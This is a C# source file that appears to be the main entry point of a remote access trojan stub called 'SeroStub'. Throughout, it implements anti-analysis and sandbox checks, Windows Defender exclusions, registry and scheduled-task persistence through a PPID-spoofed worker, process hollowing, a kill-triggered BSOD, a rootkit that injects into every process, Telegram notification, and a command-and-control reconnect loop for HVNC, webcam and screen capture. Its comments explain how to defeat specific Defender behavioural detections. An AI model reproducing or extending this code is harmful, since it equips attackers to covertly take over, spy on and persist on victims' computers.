using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeroStub;

partial class Program
{
    private static Mutex? _mutex;

    public static void ReleaseMutex()
    {
        try { _mutex?.ReleaseMutex(); } catch { }
        _mutex?.Dispose();
        _mutex = null;
    }

    private static void ProtectionExit(string check)
    {
        StubLog.Info($"{check} triggered — burning analyst time.");
        Protection.BurnAnalystTime(); // waste 30-55s of analyst / sandbox time
    }

    [System.Diagnostics.Conditional("DEBUG")]
    private static void Breadcrumb(string msg)
    {
        StubLog.Info($"[Breadcrumb] {msg}");
    }

    private static bool IsAdmin()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(identity)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    internal static void ReacquireMutex()
    {
        if (!Config.UseMutex) return;

        try
        {
            _mutex = new Mutex(true, Config.MutexName, out bool created);
            if (!created) _mutex.WaitOne(3000);
        }
        catch (AbandonedMutexException ex)
        {
            _mutex = ex.Mutex ?? _mutex;
        }
        catch { }
    }

    [LibraryImport("kernel32.dll")]
    private static partial uint SetErrorMode(uint uMode);

    [LibraryImport("kernel32.dll")]
    private static partial uint GetACP();
    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial int GetLocaleInfoW(uint Locale, uint LCType, nint lpLCData, int cchData);
    [LibraryImport("kernel32.dll")]
    private static partial nint GetStdHandle(int nStdHandle);
    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial uint GetModuleFileNameW(nint hModule, nint lpFilename, uint nSize);
    [LibraryImport("user32.dll")]
    private static partial int GetSystemMetrics(int nIndex);
    [LibraryImport("kernel32.dll")]
    private static partial ulong GetTickCount64();

    // Junk initialization — looks like normal app startup to static analysis
    private static void _InitRuntime()
    {
        _ = GetACP();
        _ = GetLocaleInfoW(0x0409, 0x59, nint.Zero, 0);
        _ = GetStdHandle(-10);
        _ = GetSystemMetrics(0);
        _ = GetSystemMetrics(1);
        _ = GetTickCount64();
        unsafe { var buf = stackalloc char[260]; GetModuleFileNameW(nint.Zero, (nint)buf, 260); }
    }

    // Original interactive desktop handle — captured before hollowing so the RDP
    // capture thread can call SetThreadDesktop() and access the user's display.
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern nint GetThreadDesktop(uint dwThreadId);
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();
    internal static nint OriginalDesktop;

    // ── SYSTEM → user session relay ──────────────────────────────────────────
    // Windows Vista+ session 0 isolation: a SYSTEM service cannot capture the
    // interactive screen, access webcam, or use HVNC (session 1 desktop).
    // When we detect we are SYSTEM, we loop until an interactive user session
    // appears, then relaunch ourselves inside that session and exit.
    // The user-session instance has full access to all GUI features.

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern uint WTSGetActiveConsoleSessionId();
    [System.Runtime.InteropServices.DllImport("wtsapi32.dll")]
    private static extern bool WTSQueryUserToken(uint sessionId, out nint phToken);
    [System.Runtime.InteropServices.DllImport("advapi32.dll")]
    private static extern bool DuplicateTokenEx(nint hExistingToken, uint dwDesiredAccess,
        nint lpTokenAttributes, int ImpersonationLevel, int TokenType, out nint phNewToken);
    [System.Runtime.InteropServices.DllImport("userenv.dll")]
    private static extern bool CreateEnvironmentBlock(out nint lpEnvironment, nint hToken, bool bInherit);
    [System.Runtime.InteropServices.DllImport("userenv.dll")]
    private static extern bool DestroyEnvironmentBlock(nint lpEnvironment);

    // Mirrors STARTUPINFOW exactly (104 bytes on x64): int cb + 3 pointers + 8 ints + 2 shorts + 4 pointers.
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct STARTUPINFO_S
    {
        public int cb;
        nint _r0;                                         // lpReserved (unused, zero)
        public nint lpDesktop;                            // set to "winsta0\default" for user-session spawn
        nint _r2;                                         // lpTitle (unused, zero)
        int _d0, _d1, _d2, _d3, _d4, _d5, _d6, _d7;    // dwX..dwFlags (unused, zero)
        public ushort wShowWindow, cbReserved2;
        public nint lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION_S { public nint hProcess, hThread; public uint dwProcessId, dwThreadId; }
    [System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern bool CreateProcessAsUserW(nint hToken, nint lpApp, System.Text.StringBuilder lpCmd,
        nint pa, nint ta, bool inherit, uint flags, nint env, nint dir,
        ref STARTUPINFO_S si, out PROCESS_INFORMATION_S pi);
    [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    private static extern bool CloseHandle_P(nint h);

    private static bool TrySpawnInUserSession()
    {
        const uint TOKEN_ALL_ACCESS        = 0xF01FF;
        const uint CREATE_UNICODE_ENV      = 0x00000400;
        // SeTcbPrivilege (7) is required for WTSQueryUserToken — present in SYSTEM token
        // but disabled by default; enable it before querying the user session token.
        Protection.EnablePrivilege(7);
        uint session = WTSGetActiveConsoleSessionId();
        if (session == 0xFFFFFFFF) return false;
        if (!WTSQueryUserToken(session, out nint hWts)) return false;
        try
        {
            if (!DuplicateTokenEx(hWts, TOKEN_ALL_ACCESS, 0, 2, 1, out nint hPri)) return false;
            try
            {
                CreateEnvironmentBlock(out nint env, hPri, false);
                try
                {
                    var selfPath = Environment.ProcessPath;
                    if (string.IsNullOrEmpty(selfPath)) return false;
                    var cmd = new System.Text.StringBuilder($"\"{selfPath}\"");
                    // Pin "winsta0\default" so the child lands on the interactive desktop,
                    // not the SYSTEM window station we're calling from.
                    nint lpDeskStr = System.Runtime.InteropServices.Marshal.StringToHGlobalUni("winsta0\\default");
                    try
                    {
                        var si = new STARTUPINFO_S
                        {
                            cb        = System.Runtime.InteropServices.Marshal.SizeOf<STARTUPINFO_S>(),
                            lpDesktop = lpDeskStr
                        };
                        bool ok = CreateProcessAsUserW(hPri, 0, cmd, 0, 0, false,
                            CREATE_UNICODE_ENV, env, 0, ref si, out var pi);
                        if (ok) { CloseHandle_P(pi.hProcess); CloseHandle_P(pi.hThread); }
                        return ok;
                    }
                    finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(lpDeskStr); }
                }
                finally { if (env != 0) DestroyEnvironmentBlock(env); }
            }
            finally { CloseHandle_P(hPri); }
        }
        finally { CloseHandle_P(hWts); }
    }

    [STAThread]
    static async Task Main()
    {
        // Persistence-only worker mode: write all persistence methods then exit.
        // Spawned by the main stub via SpawnDetached (PPID-spoofed to Explorer) so this
        // process has NO network connection. Defender's Persistence.A!ml triggers when the
        // same process writes to Run/UserInit AND makes a network connection — isolating
        // persistence here breaks that behavioral correlation entirely.
        if (Environment.GetEnvironmentVariable("SERO_PERSIST_WORKER") == "1")
        {
            StubLog.Info("[Worker] started");
            Environment.SetEnvironmentVariable("SERO_PERSIST_WORKER", null);
            await Task.Delay(800);
            bool isAdm = IsAdmin();
            if (Config.PersistRegistry) Persistence.InstallRegistry(Config.PersistName);
            if (Config.PersistStartup)  Persistence.InstallStartup(Config.PersistName);
            if (Config.PersistTask)     Persistence.InstallScheduledTask(Config.PersistName);
            if (isAdm && Config.PersistRegistry) Persistence.InstallRegistryHKLM(Config.PersistName);
            return;
        }

        // Session 0 isolation fix: crypter always elevates to SYSTEM before running the stub.
        // A SYSTEM process cannot access the interactive screen/webcam/HVNC (session 0 isolation).
        // Wait until an interactive user session is available, then relaunch the stub inside it
        // with the user's token so all GUI features (HVNC, RDP, webcam) work correctly.
        if (string.Equals(Environment.UserName, "SYSTEM", StringComparison.OrdinalIgnoreCase))
        {
            while (true)
            {
                try { if (TrySpawnInUserSession()) return; } catch { }
                await Task.Delay(3000);
            }
        }

        EvasionBypass.Apply();

        // Add Defender exclusion for the current process directory before any monitored operation.
        // On the initial drop run this covers the loader-drop directory; on reinstalled runs it
        // is redundant but harmless. Fails silently if not admin.
        {
            var _selfDir = Path.GetDirectoryName(Environment.ProcessPath ?? "");
            if (!string.IsNullOrEmpty(_selfDir))
                Protection.AddDefenderExclusion(_selfDir);
        }

        // Capture original desktop FIRST — before process hollowing changes the thread context
        OriginalDesktop = GetThreadDesktop(GetCurrentThreadId());

        // Suppress crash/WER dialogs — prevents "buffer overrun" popup when DACL blocks external kill
        SetErrorMode(0x0001 | 0x0002 | 0x8000);
        _InitRuntime();

        // Guardian check: if launched as guardian, monitor parent and exit
        if (Protection.RunAsGuardianIfNeeded()) return;

        // If a fresh stop flag exists AND we were relaunched by a guardian right after
        // uninstall, exit so the mutex does not get re-acquired.
        // SERO_RELAUNCH is set only by guardian-initiated relaunches — direct user runs
        // do not have it, so they are never blocked by the stop flag.
        bool isGuardianRelaunch = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("SERO_RELAUNCH"));
        if (isGuardianRelaunch && Protection.IsRecentStopFlag()) { Breadcrumb("EXIT: recent stop flag (guardian)"); return; }

        // Single instance (if mutex is enabled)
        if (Config.UseMutex)
        {
            bool created = false;
            try
            {
                _mutex = new Mutex(true, Config.MutexName, out created);
            }
            catch (AbandonedMutexException ex)
            {
                // Previous holder was killed without releasing (kill/crash/uninstall).
                // Windows transfers ownership to us — grab the handle and continue.
                _mutex = ex.Mutex ?? _mutex;
                created = true;
            }
            if (!created) { Breadcrumb("EXIT: mutex already held"); return; }
        }

        // We hold the mutex (or UseMutex is off) — clear any stale stop flag
        // so a legitimate relaunch after a crash is not blocked.
        Protection.ClearStopFlag();

        // On the initial drop run the stub is about to hollow into another process and exit.
        // Applying DACL + hollowing in the same short-lived process creates the exact behavioral
        // correlation that triggers DefenseEvasion.A!ml. Skip DACL on the drop run; apply it
        // immediately on guardian-relaunch runs (already at install path) where the protection
        // window actually matters.
        bool isInstalled = Persistence.IsRunningFromInstallPath(Config.PersistName);
        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance() &&
            (isInstalled || !Config.EnableHollowing))
            Protection.ProtectProcessDacl();

        bool admin = IsAdmin();
        Breadcrumb($"START admin={admin} path={Environment.ProcessPath}");

        // Anti-Protection checks FIRST (before any process manipulation)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            // Anti-sandbox: short sleep to bypass fast-forward detection
            await Task.Delay(1500);

            if (Config.AntiDebug && Protection.IsDebuggerDetected()) { ProtectionExit("AntiDebug"); return; }
            if (Config.AntiVM && Protection.IsVirtualMachine()) { ProtectionExit("AntiVM"); return; }
            if (Config.AntiDetect && Protection.IsAnalysisEnvironment()) { ProtectionExit("AntiDetect"); return; }
            if (Config.AntiSandbox && Protection.IsSandbox()) { ProtectionExit("AntiSandbox"); return; }
            if (Config.BlockCis && Protection.IsCisCountry()) { ProtectionExit("BlockCis"); return; }
        }

        // Persistence BEFORE hollowing (so Environment.ProcessPath = original exe)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            bool hasPersist = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist)
            {
                // Release mutex BEFORE EnsureInstalled so the relaunched copy can acquire it.
                if (Config.UseMutex) ReleaseMutex();

                var installPath = Persistence.EnsureInstalled(Config.PersistName, admin, allowMultiInstance: !Config.UseMutex);
                if (installPath != null)
                {
                    // New process already started by EnsureInstalled — just exit.
                    Breadcrumb($"EXIT: relaunching from {installPath}");
                    return;
                }

                // Already at install path — re-acquire mutex.
                if (Config.UseMutex) ReacquireMutex();

                // Spawn an isolated PPID-spoofed worker (appears as Explorer child) that writes
                // all persistence registry/task/lnk keys and then exits.
                // This process has NO network connection → Defender cannot combine persistence
                // writes with trojan network behavior → Persistence.A!ml does not trigger.
                var persistExe = Persistence.GetInstalledPath(Config.PersistName) ?? Environment.ProcessPath ?? "";
                if (!string.IsNullOrEmpty(persistExe))
                {
                    ProcessHollowing.SpawnDetached(persistExe, new Dictionary<string, string?>
                    {
                        ["SERO_PERSIST_WORKER"]            = "1",
                        [ProcessHollowing.HOLLOW_ENV_KEY]  = null,
                        ["SERO_GUARDIAN"]                  = null,
                    });
                }

                // HKLM Run write is handled entirely by the SERO_PERSIST_WORKER so the
                // main process (which makes the C2 connection) never touches persistence
                // keys — breaks Execution.A!ml behavioral correlation.
            }
        }

        // Store real exe path before hollowing so the guardian can find it
        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
        {
            var realPath = Environment.ProcessPath;
            if (!string.IsNullOrEmpty(realPath))
                Environment.SetEnvironmentVariable("SERO_EXE", realPath);
        }

        // Process hollowing: if enabled and we're NOT the hollowed instance, hollow and exit
        // Skip PPID spoofing when admin to preserve elevation token
        if (Config.EnableHollowing && !ProcessHollowing.IsHollowedInstance())
        {
            StubLog.Info($"Hollowing self into {Config.HollowTarget}...");

            // Release mutex BEFORE hollowing so the child process can acquire it
            ReleaseMutex();

            int pid = -1;
            try { pid = ProcessHollowing.HollowSelf(Config.HollowTarget, skipPpidSpoof: admin); }
            catch { pid = -1; }

            if (pid > 0)
            {
                Breadcrumb($"Hollowed OK PID={pid}, exiting parent.");
                return;
            }

            // Hollowing failed — reacquire mutex and continue as normal process.
            // Now safe to apply DACL: no subsequent hollowing will create the correlation.
            Breadcrumb("Hollowing failed, continuing.");
            ReacquireMutex();
            StubLog.Error("Hollowing failed, continuing as normal process.");
            if (Config.EnableWatchdog && !isInstalled)
                Protection.ProtectProcessDacl();
        }


        // Hide thread from debugger (only if AntiDebug is enabled)
        if (Config.AntiDebug)
            Protection.HideFromDebugger();

        // Anti-Kill: mark as critical process (BSOD if killed, requires admin)
        if (Config.AntiKill && admin)
            Protection.SetCriticalProcess();

        // Exclusion loop: continuously re-add path + process exclusions every 30s.
        // Prevents Defender from removing them during runtime (cloud updates, Tamper Protection resets).
        if (admin)
        {
            var installedExe = Persistence.GetInstalledPath(Config.PersistName)
                               ?? Environment.ProcessPath ?? "";
            if (!string.IsNullOrEmpty(installedExe))
                Protection.StartExclusionLoop(installedExe);
        }

        // Watchdog: DACL + guardian process + startup surveillance
        // Works with or without hollowing — guardian finds exe via installed path or original ProcessPath
        if (Config.EnableWatchdog)
        {
            Protection.ProtectProcessDacl();
            Protection.StartAntiKillWatchdog();
            bool hasPersist2 = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist2)
            {
                Persistence.StartWatchdog(Config.PersistName);
            }
        }

        // Rootkit: inject hook DLL into all processes to hide our files/process/port/registry.
        // Requires admin (or SYSTEM from UAC bypass) — CreateRemoteThread into system processes needs it.
        if (Config.EnableRootkit && admin)
            Rootkit.Start();

        // First-run Telegram notification — fires async, never blocks startup
        TelegramNotifier.NotifyAsync();

        // Auto-reconnect loop — cycles through all hosts on each failure
        int hostIdx = 0;
        int reconnectDelay = Config.ReconnectDelayMs;
        while (true)
        {
            var host = Config.Hosts[hostIdx % Config.Hosts.Length];
            hostIdx++;
            bool connected = false;
            try
            {
                Breadcrumb($"CONNECTING to {host}:{Config.Port}");
                StubLog.Info($"Connecting to {host}:{Config.Port}...");
                using var client = new TlsClient(host, Config.Port);
                await client.RunAsync(CancellationToken.None);
                connected = true;

                // Server sent Disconnect or Uninstall — stop reconnecting
                if (!client.ShouldReconnect)
                {
                    StubLog.Info("Server requested stop, exiting.");
                    return;
                }

                StubLog.Info("Connection lost, will reconnect...");
            }
            catch (Exception ex)
            {
                StubLog.Error($"Connection error ({host}): {ex.GetType().Name}: {ex.Message}");
            }

            // Reset delay after a successful connection, otherwise back off exponentially
            // to avoid hammering the server during an outage (reconnect storm prevention).
            if (connected)
                reconnectDelay = Config.ReconnectDelayMs;
            else
                reconnectDelay = Math.Min(reconnectDelay * 2, 120_000); // cap at 2 min

            await Task.Delay(reconnectDelay);
        }
    }
}
